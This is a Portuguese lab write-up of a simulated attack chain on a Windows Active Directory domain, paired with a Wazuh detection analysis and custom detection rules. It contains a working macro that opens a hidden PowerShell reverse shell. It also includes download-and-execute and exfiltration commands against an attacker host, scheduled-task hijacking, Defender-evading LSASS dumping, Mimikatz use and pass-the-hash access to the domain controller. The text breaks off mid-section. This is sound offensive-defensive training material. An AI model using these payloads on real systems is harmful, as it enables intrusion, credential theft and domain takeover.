# Simulação de Cadeia de Ataque - Laboratório de Segurança Ofensiva
<br>
<br>

## Objetivo

Esta parte do projeto é a continuação do projeto anterior [Windows Server AD](https://github.com/MercioRodrigues/Windows-server-AD/blob/main/README.md), no qual foi construído, em laboratório, um ambiente Active Directory. Foram também utilizadas ferramentas que já tinham sido preparadas em outro projeto que realizei anteriormente, o [SOC SOAR Project](https://github.com/MercioRodrigues/SOC-SOAR-Project), nomeadamente o **Wazuh**.  
<br>  
Esta fase tem como objetivo simular uma cadeia de ataque realista em um ambiente de domínio Windows, sem detecção por parte do Windows Defender, explorando diferentes etapas de comprometimento típicas de atacantes reais. A simulação foi conduzida em um laboratório controlado, permitindo, posteriormente, a análise detalhada de cada fase da intrusão.


A cadeia de ataque envolve as seguintes etapas:

1. [Acesso inicial:](#-fase-1---acesso-inicial-via-macro-em-documento-word-phishing) comprometimento de uma estação de trabalho através da execução de uma macro maliciosa em um documento do Word.
2. [Escalada de privilégios local:](#-fase-2--escalada-de-privil%C3%A9gios-local) obtenção de privilégios SYSTEM explorando uma tarefa agendada mal configurada.
3. [Enumeração do dominio:](#-fase-3--enumera%C3%A7%C3%A3o-p%C3%B3s-escala%C3%A7%C3%A3o) Enumerar o ambiente local e de domínio e avaliar a viabilidade de extrair as credenciais da memória (lsass.exe).
4. [Exfiltração de credenciais e Acesso ao DC:](#fase-4--extra%C3%A7%C3%A3o-de-credenciais-e-acesso-ao-dc) extração da memória do processo LSASS para capturar credenciais em texto claro e hashes NTLM e acesso ao controlador de domínio (Domain Controller) utilizando técnicas de Pass-the-Hash.
 

[Análise pós-ataque:](#Análise-pós-ataque) utilização de ferramentas de monitorização e deteção como **Wazuh** para investigar a intrusão e compreender os rastros deixados nos logs do sistema e na rede.

O objetivo final é obter não apenas uma shell no controlador de domínio, mas também documentar detalhadamente os indicadores de comprometimento (IoCs), comportamentos suspeitos e evidências forenses que podem ser usadas por equipes de defesa para deteção precoce e resposta a incidentes.

---

⚠️ *Aviso: Este projeto foi realizado exclusivamente para fins educacionais e em ambiente isolado. Nenhuma das técnicas aqui descritas deve ser utilizada em ambientes reais sem autorização explícita.*


<br>
<br>

## Preparação do Wazuh

Antes de começar o ataque e para e para que o próprio Wazuh consiga gerar os alertas pretendidos é necessário criar regras customizadas. 
Criei as seguintes regras no ficheiro `local_rules.xml` do wazuh.

```
<group name="windows,powershell,">

<rule id="100206" level="5">
    <if_sid>60009</if_sid>
    <field name="win.eventdata.contextInfo" type="pcre2">(?i)Invoke-WebRequest|IWR.*-url|IWR.*-InFile</field>
    <description>Invoke Webrequest executed, possible download cradle detected.</description>
    <mitre>
      <id>T1059.001</id>
    </mitre>
  </rule>

<rule id="115001" level="10">
  <if_group>windows</if_group>
  <field name="win.eventdata.ruleName" type="pcre2" >technique_id=T1053,technique_name=Scheduled Task</field>
  <description>A Newly Scheduled Task has been Detected on $(win.system.computer)</description>
  <mitre>
    <id>T1053</id>
  </mitre>
</rule>

 <rule id="100504" level="13">
    <if_group>windows</if_group>
    <field name="win.eventdata.scriptBlockText" type="pcre2">(?i)tcpclient</field>
    <description>Powershell created a new TCPClient – possible reverse shell.</description>
  </rule>

<rule id="100510" level="1">
  <if_sid>60009</if_sid>
  <field name="win.system.eventID">^4103$</field>
  <field name="win.eventdata.contextInfo" type="pcre2">(?i)TcpClient</field>
  <description>PowerShell TcpClient activity detected (Event ID 4103)</description>
  <mitre>
    <id>T1059.001</id>
    <id>T1105</id>
  </mitre>
</rule>

<rule id="100520" level="1">
  <if_sid>91801</if_sid>
  <field name="win.system.eventID">^4100$</field>
  <field name="win.eventdata.contextInfo" type="pcre2">(?i)TcpClient</field>
  <description>PowerShell engine restart with TcpClient — possible loop</description>
  <mitre>
    <id>T1059.001</id>
  </mitre>
</rule>


<rule id="100530" level="13" frequency="4" timeframe="60">
  <if_matched_sid>100510</if_matched_sid>
  <description>Repeated PowerShell TcpClient activity loop — possible reverse shell</description>
  <mitre>
    <id>T1059.001</id>
    <id>T1105</id>
  </mitre>
</rule>

<rule id="100540" level="13" frequency="4" timeframe="60">
  <if_matched_sid>100520</if_matched_sid>
  <description>Repeated PowerShell engine restart with TcpClient — possible reverse shell</description>
  <mitre>
    <id>T1059.001</id>
    <id>T1105</id>
  </mitre>
</rule>

</group>

<group name="win-sysmon">
  <rule id="100502" level="10">
    <if_sid>92101</if_sid>
    <field name="win.system.eventID" type="pcre2">^3$</field>
    <field name="win.eventdata.image" type="pcre2">(?i)^C:\\\\Windows\\\\(System32|SysWOW64)\\\\WindowsPowerShell\\\\v1\.0\\\\powershell\.exe$</field>
    <description>Network connection initiated by PowerShell to "$(win.eventdata.destinationIp)" on port "$(win.eventdata.destinationPort)"</description>
     <mitre>
      <id>T1059.001</id>
    </mitre>
  </rule>

<rule id="100503" level="13" frequency="3" timeframe="60">
    <if_matched_sid>100502</if_matched_sid>
    <description>Multiple network connections initiated by PowerShell to "$(win.eventdata.destinationIp)" on port "$(win.eventdata.destinationPort)"</description>
    <mitre>
      <id>T1059.001</id>
    </mitre>
  </rule>
</group>

<group name="lotl,powershell,">
 <rule id="100019" level="9">
    <if_sid>60009</if_sid>
    <field name="win.eventdata.contextInfo" type="pcre2">(?i)Invoke-WebRequest</field>
    <field name="win.eventdata.payload" type="pcre2">(?i)(Uri|http|Post|InFile|C:\\)</field>
    <description>Possible Powershell data exfiltration detected .</description>
    <mitre>
      <id>T1059.001</id>
      <id>T1567.002</id>
    </mitre>
  </rule>

<rule id="100021" level="9">
  <if_sid>60009</if_sid>
  <field name="win.eventdata.contextInfo" type="pcre2">(?i)\bInvoke-RestMethod\b</field>
  <field name="win.eventdata.contextInfo" type="pcre2">(?i)(Uri|http|PUT|InFile|C:\\)</field>
  <description>Possible PowerShell data exfiltration using Invoke-RestMethod detected.</description>
  <mitre>
    <id>T1059.001</id>
    <id>T1567.002</id>
  </mitre>
</rule>

</group>

<group name="windows,attack">

  <rule id="100011" level="10">
    <if_sid>61613</if_sid>
    <field name="win.eventdata.targetFilename" type="pcre2">(?i)\\[^\\]*\.dmp$</field>
    <field name="win.eventdata.image" negate="yes" type="pcre2">(?i)\\lsass.*</field>
    <description>Possible adversary activity - LSASS memory dump: $(win.eventdata.image) created a new file on $(win.system.computer) endpoint.</description>
    <mitre>
      <id>T1003.001</id>
    </mitre>
  </rule>

</group>
```
 <br/>
  <br/>

## 🧪 Fase 1 - Acesso Inicial via Macro em Documento Word (Phishing)

Nesta fase inicial, o atacante utilizou **engenharia social (phishing)** para induzir um colaborador da organização a abrir um documento Word malicioso. O documento continha uma macro em VBA (Visual Basic for Applications) configurada para executar automaticamente ao abrir o ficheiro.

###  Objetivo

Obter uma **shell reversa PowerShell** no sistema da vítima sem levantar suspeitas, utilizando `Wscript.Shell` para evadir políticas de execução e manter a execução em segundo plano.

---

### Conteúdo da Macro

A macro maliciosa foi inserida no Editor do Visual Basic para Aplicações, dentro do módulo `NewMacros`. O código é dividido em duas partes:

- `AutoOpen()`: executa a macro automaticamente ao abrir o ficheiro
- `test()`: define e executa o payload PowerShell em modo oculto

```vb
Sub AutoOpen()
    Call test
End Sub

Sub test()
    ' test Macro
    Dim objshell As Object
    Set objshell = CreateObject("Wscript.Shell")
    objshell.Run "powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ""$command = {while($true){try {$cl = New-Object System.Net.Sockets.TcpClient('192.168.1.205',443);$st = $cl.GetStream();$rd = New-Object IO.StreamReader($st);$wr = New-Object IO.StreamWriter($st);$wr.AutoFlush = $true;while($cl.Connected){$cmd = $rd.ReadLine();if($cmd -eq 'exit'){break;}try{$res = iex $cmd 2>&1 | Out-String;}catch{$res = $_.Exception.Message;} $wr.WriteLine($res);$wr.Flush();}$cl.Close();}catch{Start-Sleep -Seconds 10;}}}; Start-Process powershell -WindowStyle Hidden -ArgumentList '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', $command"""
    Set objshell = Nothing
End Sub
```

<p align="center">
 
  <br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/14196c25-96e6-43dc-b1f4-ce14bd0be6be" height="60%" width="60%"/>
    <br/>
    <br/>
  <p/>

---

### Listener do Atacante

Enquanto o documento era aberto pela vítima, o atacante encontrava-se à escuta na máquina Kali, utilizando `netcat` com `rlwrap` para suportar histórico e edição de linha:

```bash
rlwrap nc -lvnp 443
```
<p align="center">
<br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/1d6fd6d7-a226-44c2-a28a-da105117975d" height="60%" width="60%"/>
    <br/>
    <br/>
  <p/>

**Resumo**

O código PowerShell embutido na macro estabelece uma conexão TCP reversa para o endereço do atacante (192.168.1.205) na porta 443. Após a conexão, o script entra num loop que:

**1.** Recebe comandos enviados pelo atacante

**2.** Executa os comandos localmente com Invoke-Expression (iex)

**3.** Envia a saída da execução de volta através do canal TCP

Este tipo de técnica é comum em ataques fileless, pois evita gravações em disco e contorna políticas de execução do PowerShell.

 <br/>
    <br/>

## 🧪 Fase 2 — Escalada de Privilégios Local

Após o acesso inicial, o próximo objetivo foi escalar privilégios para obter controlo total do sistema como **NT AUTHORITY\SYSTEM**.  
Esta fase consistiu na **descoberta e exploração de uma tarefa agendada mal configurada**, permitindo a execução de código com permissões elevadas.

---

### 1. Preparação do Ambiente de Investigação

Foi criado um servidor de upload/download em Python na máquina atacante para facilitar a transferência de ficheiros entre as máquinas:

```bash
python3 upload_server.py
# [+] Serving HTTP upload/download server at port 8080
```

---

### 2. Execução do WinPEAS e Exfiltração do Output

Na shell da vítima, foi executado o `winPEASps1.ps1`, e a saída foi guardada num ficheiro `.txt`:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.205:8080/winPEASps1.ps1') | Out-File "$env:USERPROFILE\Downloads\winpeas.txt" -Encoding ASCII
```

Em seguida, o ficheiro foi exfiltrado para a máquina do atacante:

```powershell
Invoke-RestMethod -Uri "http://192.168.1.205:8080/winpeas.txt" -Method PUT -InFile "C:\Users\jsilva\Downloads\winpeas.txt"
```

<p align="center">
    <br/>
    <br/>
      <img src="https://github.com/user-attachments/assets/d11db3f6-816b-45a4-b7a7-11ef05ae2246" height="60%" width="60%"/>
    <br/>
    <br/>
    <img src="https://github.com/user-attachments/assets/1cd6ede9-e275-484c-9a32-ac27e3fbdcac" height="60%" width="60%"/>
    <br/>
    <br/>
<p/>



---

### 3. Análise do Output do WinPEAS

Na máquina atacante, o output foi segmentado por tarefas agendadas:

```bash
awk '
/^TaskName:/ {
    ++i;
    f = sprintf("task_%03d.txt", i);
}
f { print > f }
' winpeas.txt
```

<p align="center">
    <br/>
    <br/>
      <img src="https://github.com/user-attachments/assets/1dacf129-6f1a-4b05-8fcb-f7febbe8d0bb" height="60%" width="60%"/>
    <br/>
    <br/>
<p/>
    

Depois, filtrou-se por tarefas que correm como `SYSTEM`:

```bash
grep -l "Run As User: *SYSTEM" task_*.txt > SYSTEM_tasks.txt
```

E procuraram-se scripts suspeitos:

```bash
grep -Ei "ps1|bat|cmd|exe" $(cat SYSTEM_tasks.txt) | grep -i "task to run"
```
<p align="center">
    <br/>
    <br/>
      <img src="https://github.com/user-attachments/assets/845d809a-25e0-4a1a-b050-028f2f5db977" height="60%" width="60%"/>
    <br/>
    <br/>
<p/>


Foi identificado a seguinte tarefa crítica:

```text
task_012.txt:Task To Run: powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File C:\TempTask\svc_launcher.ps1
```

Lendo o conteudo de **task_012.txt** conseguimos obter a informação mais completa sobre a tarefa.

<p align="center">
    <br/>
    <br/>
      <img src="https://github.com/user-attachments/assets/c523e3eb-39da-4398-b588-4091550ed2bf" height="60%" width="60%"/>
    <br/>
    <br/>
<p/>
    

---

### 4. Verificação de Permissões

Foi verificado que o utilizador comprometido (`jsilva`) tinha permissões de **controlo total** sobre o ficheiro `.ps1` usado pela tarefa:

```powershell
icacls C:\TempTask\svc_launcher.ps1
```
<p align="center">
    <br/>
    <br/>
      <img src="https://github.com/user-attachments/assets/875ef2f9-e9af-465e-b1c8-45014cca5b24" height="60%" width="60%"/>
    <br/>
    <br/>
<p/>


Saída relevante:

```
PILAO\jsilva:(I)(F)          → Full control — pode sobrescrever este ficheiro
NT AUTHORITY\SYSTEM:(I)(F)   → A tarefa agendada corre o script como SYSTEM
```

---

### 5. Substituição do Script e Execução da Tarefa

Foi feito o upload de um **script malicioso** com reverse shell, substituindo o original:

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'http://192.168.1.205:8080/svc_launcher.ps1' -OutFile 'C:\TempTask\svc_launcher.ps1'"
```

<p align="center">
    <br/>
    <br/>
      <img src="https://github.com/user-attachments/assets/4d36fb25-f3e4-47c3-b7c3-4efe2c2cf370" height="60%" width="60%"/>
    <br/>
    <br/>
<p/>


Como a tarefa era configurada para correr ao arrancar o sistema, pode-se esperar que a vitima inicie a máquina mas, como tratasse de um laboratório forcei o reinício:

```powershell
Restart-Computer -Force
```

---

### 6. Resultado — Shell como SYSTEM

Na máquina atacante, aguardou-se ligação à porta 4444:

```bash
rlwrap nc -lvnp 4444
```

Após o reinício da vítima:

<p align="center">
    <br/>
    <br/>
      <img src="https://github.com/user-attachments/assets/448ad18a-e3b8-4bee-b28b-f0d69decd94f" height="60%" width="60%"/>
    <br/>
    <br/>
<p/>




A escalada foi bem-sucedida! O atacante obteve **acesso completo com privilégios SYSTEM**.

---

### Resumo

A má configuração de permissões num script chamado por uma tarefa agendada como SYSTEM foi explorada com sucesso para **escalar privilégios localmente**.

A utilização do `winPEAS` permitiu descobrir a vulnerabilidade, a análise de permissões confirmou a possibilidade de exploração, e a substituição do script permitiu ganhar **controlo total do sistema**, com acesso **persistente**.

<br/>
<br/>

## 🧪 Fase 3 – Enumeração Pós-Escalação

Após escalar privilégios locais até `NT AUTHORITY\SYSTEM`, o objetivo passou a ser:

- **Enumerar o ambiente local e de domínio**  
- **Avaliar a viabilidade de extrair credenciais da memória (`lsass.exe`)**

---

### 1. Verificar se a máquina está num domínio

```powershell
systeminfo | findstr /B /C:"Domain"
```

**Resultado:**

```
Domain: pilao.pt
```

✅ Isto confirma que a máquina está unida ao domínio `pilao.pt`. Esse facto é importante porque credenciais de **utilizadores do domínio** podem estar armazenadas em memória, especialmente se fizeram login interativo recentemente.

---

### 2. Obter o hostname da máquina comprometida

```powershell
hostname
```

**Resultado:**

```
Client1
```

Esta informação ajuda a identificar o endpoint dentro da infraestrutura.

---

### 3. Listar utilizadores locais e de domínio

```powershell
wmic useraccount get name,sid
```

🔍 Procura por utilizadores olhando para o `RID`:

- `500` → Administrator  
- `502` → krbtgt (conta usada pelo Kerberos)  
- `1000+` → contas personalizadas  

<p align="center">
<br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/b1e32638-eeb0-4172-b39f-899b302a4ac4" height="60%" width="60%"/>
    <br/>
    <br/>
  <p/>

```powershell
net group "Domain Admins" /domain
```

<p align="center">
<br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/4a37c0e3-06c1-47da-bbc6-865846bea87b" height="60%" width="60%"/>
    <br/>
    <br/>
  <p/>


**Resultado:**

```
Group name     Domain Admins
Members:
  Administrator
```

✅ A presença do utilizador `Administrator` no grupo `Domain Admins` confirma que este tem **controle total** sobre o domínio.

---

### 4. Ver permissões

```powershell
whoami /all
```
<p align="center">
<br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/023e075c-27b1-4029-a32c-29dceddff2b9" height="60%" width="60%"/>
    <br/>
    <br/>
  <p/>


**Resultados importantes:**

User: NT AUTHORITY\SYSTEM

Groups:
- BUILTIN\Administrators
- NT AUTHORITY\SERVICE
- NT AUTHORITY\Authenticated Users
- NT AUTHORITY\This Organization
- LOCAL
- NT SERVICE\Schedule

Previlégios:
**SeDebugPrivilege:** ✅ Enabled

✅ Isto confirma:
- Estamos como NT **AUTHORITY\SYSTEM**
- Com **privilégios máximos no domínio**
- E com o privilégio **SeDebugPrivilege**, necessário para ler a memória de lsass.exe




🚨 O privilégio `SeDebugPrivilege` permite ler a memória de processos de outros utilizadores, inclusive do `lsass.exe`.

---

### 5. Enumerar os Controladores de Domínio (Domain Controllers)

```powershell
nltest /dclist:pilao.pt
```

**Resultado:**

```
Marcio.pilao.pt [PDC]
```
<br/>
<br/>

**Comando**

```powershell
nslookup -type=SRV _ldap._tcp.dc._msdcs.pilao.pt
```

<p align="center">
<br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/fa036c25-c1b6-4673-98c9-df17860bed9d" height="60%" width="60%"/>
    <br/>
    <br/>
  <p/>


**Resultado:**

```
_ldap._tcp.dc._msdcs.pilao.pt   SRV service location:
    svr hostname = marcio.pilao.pt
    svr hostname = server2.pilao.pt

marcio.pilao.pt -> 192.168.1.200  
server2.pilao.pt -> 192.168.1.201
```

✅ Identificar os Domain Controllers é essencial para **movimento lateral**.

---

### 6. Verificar partilhas administrativas no domínio

```powershell
net view \\pilao.pt
```

**Resultado:**

```
NETLOGON    Disk    Logon server share
SYSVOL      Disk    Logon server share
```

**Estes são diretórios críticos do AD, usados para scripts de login e políticas de grupo (GPOs).** 

---

### 7. Testar acesso ao C$ (Admin Share) no DC

```powershell
Start-Process cmd -ArgumentList '/c net use \\pilao.pt\C$' -WindowStyle Hidden
```

```powershell
Get-SmbConnection | Select-Object -Property ShareName, ServerName, UserName
```

<p align="center">
<br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/d0b0f854-9e95-483a-97ec-383e0e512ea7" height="60%" width="60%"/>
    <br/>
    <br/>
  <p/>

**Resultado:**

```
ShareName ServerName       UserName
--------- -----------      --------
IPC$      Marcio.pilao.pt  PILAO\CLIENT1$
C$        pilao.pt         PILAO\Administrator
```

✅ Isto confirma que a shell atual tem acesso **total** ao sistema de ficheiros do DC via `C$` — partilha administrativa para administradores.

---

### Implicações para o Atacante

Com estes dados confirmados:

- ✅ Shell com privilégios de **Domain Admin**  
- ✅ Acesso SMB autenticado ao Domain Controller  
- ✅ Capacidade para:   
  - Exfiltrar credenciais  
  - Iniciar **movimento lateral** (pivoting) ou **persistência em domínio**

---

### Conclusão da Fase 3

Com privilégios de `NT AUTHORITY\SYSTEM` e verificação de que estamos como **Domain Admin**, foi possível confirmar que o sistema comprometido é uma excelente base para:

- Extração de credenciais da memória (`lsass.exe`).
- Acesso irrestrito ao domínio.  

---

<br/>
    <br/>

## 🧪Fase 4 — Extração de Credenciais e Acesso ao DC

Após a obtenção de privilégios SYSTEM, o objetivo passou a ser capturar credenciais da memória do processo `lsass.exe`, de forma furtiva e sem acionar o Defender. Essas credenciais permitiram depois acesso ao Controlador de Domínio.

---

### 1. Compilar o NativeDump no Kali Linux

A ferramenta utilizada foi o **NativeDump** (versão em Golang), que depois de sofrer cross-compilation não foi detetável por soluções como o Windows Defender.

```bash
wget https://raw.githubusercontent.com/ricardojoserf/NativeDump/main/golang-flavour/nativedump.go
```

Inicialização do projeto Go:

```bash
go mod init nativedump
go mod tidy
```

Compilação para Windows (cross-compilation):

```bash
env GOOS=windows GOARCH=amd64 go build nativedump.go
```

<p align="center">
<br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/a252cd72-e443-4422-a4e3-d41527263962" height="80%" width="80%"/>
    <br/>
    <br/>
  <p/>



✅ Gera o ficheiro `nativedump.exe`, pronto para transferência.

---

### 2. Transferência do Executável para a Vítima

```powershell
Invoke-WebRequest -Uri "http://192.168.1.205:8080/nativedump.exe" -OutFile "C:\Windows\Temp\nativedump.exe"
cd C:\Windows\Temp
```

<p align="center">
<br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/bccb6186-b9d4-468a-b900-b3eb673126bf" height="60%" width="60%"/>
    <br/>
    <br/>
  <p/>

Transferência feita sem levantar alertas.

---

### 3. Dump de LSASS

```powershell
.\nativedump.exe -o .\proc_664.dmp
```

<p align="center">
<br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/3125424b-68fa-4579-a267-79478a053e1e" height="60%" width="60%"/>
    <br/>
    <br/>
  <p/>

✅ O NativeDump identificou automaticamente o PID do processo `lsass.exe` e gerou um dump da sua memória sem alertar o Windows Defender. Este dump incluiu credenciais e hashes em uso no momento.

---

### 4. Exfiltrar o Dump para o Atacante

```powershell
Invoke-RestMethod -Uri "http://192.168.1.205:8080/proc_696.dmp" -Method PUT -InFile "C:\Windows\Temp\proc_696.dmp"
```

<p align="center">
<br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/69713f1e-ff9c-4051-9ad8-6ca858fcae0f" height="60%" width="60%"/>
    <br/>
    <br/>
  <p/>

✅ O dump foi transferido com sucesso para análise offline no Kali.

---

### 5. Análise com Mimikatz

A análise do ficheiro `.dmp` foi feita offline no Kali com **Mimikatz**, via `wine`:

```bash
wine mimikatz.exe
```

Comandos utilizados:

```mimikatz
sekurlsa::minidump /home/kali/Downloads/uploadserver/proc_696.dmp
sekurlsa::logonPasswords
```

<p align="center">
<br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/30aa347b-b5bb-4763-a773-a5f013692b45" height="60%" width="60%"/>
    <br/>
    <br/>
  <p/>

<p align="center">
<br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/760f2bf8-63d6-42ba-9143-596a1c739a0d" height="60%" width="60%"/>
    <br/>
    <br/>
  <p/>


**Output relevante:**

```
Username : Administrator 500
NTLM     : a1f074c272b7d460ccdd7f8f19c5419b
Já sabemos que pertence ao domínio PILAO e o DC tem IP:192.168.1.200 
```

✅ Obtido o hash NTLM do utilizador `Administrator` (confirmado como membro do grupo `Domain Admins`).

---

### 6. Acesso Remoto com Pass-The-Hash

Com as informações necessárias e o hash NTLM em posse, foi possível autenticar no **Controlador de Domínio** remotamente:

```bash
python3 ~/impacket/examples/wmiexec.py PILAO/Administrator@192.168.1.200 -hashes :a1f074c272b7d460ccdd7f8f19c5419b
```


<p align="center">
<br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/b990afa8-37c4-4eca-9e0f-9f8b189664e5" height="100%" width="100%"/>
    <br/>
    <br/>
  <p/>

Shell remota estabelecida:

```cmd
C:\> whoami
pilao\administrator
```

---

### ✅ Resultado

O atacante agora detém controlo completo sobre o domínio:

- Acesso ao **DC (Domain Controller)**
- Permissões de **Administrador de Domínio**
- Capacidade de:
  - Extrair hashes de toda a base de utilizadores
  - Modificar políticas de grupo (GPOs)
  - Criar utilizadores e persistência
  - Efetuar **movimentações laterais**
  - Lançar ataques como Golden Ticket ou DCSync

---

<br/><br/>
<br/><br/>

# Análise pós-Ataque

<br/>
<br/>

##  🧩 Fase 1 — Deteção de Acesso Inicial via Macro Maliciosa (Phishing)
<br/>
<br/>

###  Objetivo da Monitorização
<br/>

Detectar tentativas de execução remota sem ficheiros (fileless), explorando macros em documentos do Office e invocação de comandos PowerShell com técnicas de evasão.

<br/>
<br/>

###  Detalhes da Deteção com Wazuh

Durante esta fase, o agente Wazuh configurado na máquina da vítima reportou diversos eventos críticos que ajudam a reconstruir o vetor de intrusão.
<br/>
<br/>
![Screenshot 2025-06-22 002321](https://github.com/user-attachments/assets/04d864fb-a471-46c2-b14f-3e421998afe9)
<br/>
<br/>
*Resumo cronológico dos alertas gerados nesta fase, fornecendo contexto de execução e correlação entre regras.*

---
<br/>
<br/>

###  1. Criação de ficheiro `.LNK` via WINWORD.EXE


<p align="center">
<br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/b19d84b0-be06-44eb-9600-c98fd7207921" height="80%" width="80%"/>
    <br/>
    <br/>
  <p/>


> Este alerta mostra que a aplicação Microsoft Word (`WINWORD.EXE`) criou um ficheiro `.LNK` suspeito em `AppData\Roaming\Microsoft\Office\Recent`.

**Detalhes relevantes:**
- **Técnica detetada**: `T1187` — *Forced Authentication*
- **Ficheiro gerado**: `test.LNK`
- **Canal**: `Microsoft-Windows-Sysmon/Operational`
- **User**: `PILAO\\jsilva`

> ⚠️ Este tipo de evento é frequentemente associado a métodos iniciais de persistência ou spear phishing, onde o `.LNK` serve de ponte para execução remota ou carga maliciosa adicional.

---
<br/>
<br/>

###  2. Execução de Script PowerShell com TcpClient

<p align="center">
<br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/cf846f9c-3b4d-4198-b14f-6ef0ee7eabda" height="80%" width="80%"/>
    <br/>
    <br/>
  <p/>


> Foi registada a criação de um script PowerShell que estabelece uma ligação TCP à máquina de controlo (`192.168.1.205:443`).

**Comportamento detetado:**
- **Canal**: `Microsoft-Windows-PowerShell/Operational`
- **Técnica usada**: `TcpClient` (System.Net.Sockets)
- **Severidade**: `WARNING`
- **Indicadores de Evasão**:
  - `-NoProfile`
  - `-ExecutionPolicy Bypass`
  - `-WindowStyle Hidden`
- **Evento ID**: `4104` — Execução de blocos de script PowerShell

> ⚠️ Estes padrões são comuns em **reverse shells** fileless, onde o código malicioso não reside no disco, dificultando deteção baseada em assinaturas.

---

<br/>
<br/>

###  3. Ligação de Rede por PowerShell

<p align="center">
<br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/f9f16950-3598-4981-8742-58f1d1c51148" height="80%" width="80%"/>
    <br/>
    <br/>
  <p/>

> Foi detetada uma ligação de rede iniciada por PowerShell para o endereço `192.168.1.205`, porta `443`.

**Pontos chave do alerta:**
- **Regra Wazuh**: `technique_id=T1059.001` (PowerShell Execution)
- **Processo ativo**: `C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`
- **Origem do utilizador**: `PILAO\\jsilva`
- **Canal de deteção**: Sysmon

> ⚠️ Comunicação na porta 443 com comportamento PowerShell é altamente suspeita de canal C2 (Command and Control).

---

<br/>
<br/>

###  4. Execução de whoami.exe em contexto malicioso

<p align="center">
<br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/0b8cb22d-4066-4b3e-915c-94980031f3a8" height="80%" width="80%"/>
    <br/>
    <br/>
  <p/>



> O sistema detetou a execução de `whoami.exe` iniciada a partir de `powershell.exe`, com o parent command sendo o script malicioso executado que originou a reverse shell. Corroborando a ideia que o comando whoami foi executado na reverse shell.

**Cadeia de processo:**
- **Parent**: `powershell.exe` com `TcpClient`
- **Child**: `C:\Windows\SysWOW64\whoami.exe`
- **Propósito**: confirmação de permissões no sistema

> ⚠️ É comum em ataques pós-exploração para validar se o acesso obtido tem privilégios adequados para continuar o ataque.

---
<br/><br/>

### ✅ Conclusão da Fase 1
<br/><br/>
A Wazuh demonstrou capacidades eficazes na deteção de comportamentos **fileless**, utilizando análise de processo, criação de ficheiros, execução de comandos PowerShell, e atividades de rede.

**Resumo dos indicadores detetados:**
- Execução remota via `WINWORD.EXE`
- `.LNK` drop suspeito
- Script PowerShell com ligações TCP e bypass de políticas
- whoami executado sob contexto malicioso

🔐 **Recomendações:**
- Usar políticas de grupo (GPO) para bloquear completamente macros em ficheiros provenientes da internet.
- Configurar o Office para apenas permitir macros assinadas digitalmente por entidades confiáveis.
- Criar regras para bloquear execução de PowerShell em contextos não administrativos.
- Bloquear escrita de .lnk em diretórios sensíveis por parte de aplicações como WINWORD.EXE
- Usar AMSI (Antimalware Scan Interface) para bloquear scripts ofuscados ou suspeitos em tempo real.
- Usar EDR para bloquear execuções suspeitas com base em heurística e MITRE ATT&CK TTPs.
- Usar alerta de correlação para deteção multi-evento (chain-based).
- **Realizar campanhas regulares de simulação de phishing e sensibilização cibernética treinando colaboradores.**

---

<br/><br/>
#### Resultado

A fase de acesso inicial foi plenamente detetada pelo Wazuh com base em:
- Relacionamento de processos (Office → PowerShell)
- Comportamento de rede anómalo
- Comando PowerShell suspeito
- Execução fileless in-memory

Estes dados permitiriam uma **ação de resposta imediata e eficaz** por parte de um SOC ou EDR automatizado.

---
<br/>
<br/>

## 🧩 Fase 2 — Escalada de Privilégios

<br/>
<br/>

###  Alertas Gerados

<p align="center">
<br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/e5280d6f-2b8c-4c14-abc5-c4fc6d2e3ce4" height="80%" width="80%"/>
 <br/>
   <br/>
 <img src="https://github.com/user-attachments/assets/1e52597f-becb-4683-aba3-110be8ba0ec9" height="80%" width="80%"/>
    <br/>
    <br/>
  <p/>

> Durante esta fase, é evidente o início da pós-exploração, com o objetivo de obter controlo privilegiado sobre o sistema. As imagens mostram uma sequência coordenada de alertas relacionados com execução de código, comunicações de rede, movimentação lateral e potenciais alterações ao sistema para persistência.

<br/>
<br/>

####  Padrões identificados:
- Utilização de **PowerShell para executar comandos remotamente**.
- **Exfiltração de dados** usando `Invoke-RestMethod`.
- Comunicação com um servidor de controlo na porta **8080**, usada para upload e download de scripts e resultados.
- Execução de binários do sistema (`icacls.exe`, `schtasks.exe`) a partir de localizações suspeitas.
- Alertas sobre **possível execução de código via strings**, download cradles e criação ou alteração de scripts `.ps1`.

<br/>
<br/>

> ⚠️ Estes eventos indicam claramente uma **fase de escalada de privilégios local**, na qual o atacante procura aumentar o seu nível de acesso, manter persistência e preparar fases subsequentes de exploração.

---

<br/>
<br/>

###  1. Transferência de Script PowerShell via HTTP (winPEAS)

<p align="center">
<br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/7f11b134-5041-4fb8-ad49-064e94ae245e" height="80%" width="80%"/>
 <br/>
   <br/>
 <img src="https://github.com/user-attachments/assets/59382103-474c-4647-a342-669e9b19e7d0" height="80%" width="80%"/>
    <br/>
    <br/>
  <p/>

> ⚠️ Foi detetada uma ligação de rede iniciada pelo processo `powershell.exe` para o endereço **192.168.1.205** na porta **8080**, seguida da execução de um comando para descarregar e executar um script e o seu output armazenado num ficheiro.

---

<br/>
<br/>

#### Detalhes do Comportamento

- **Processo responsável**: `C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`
- **Comando executado**:
```powershell
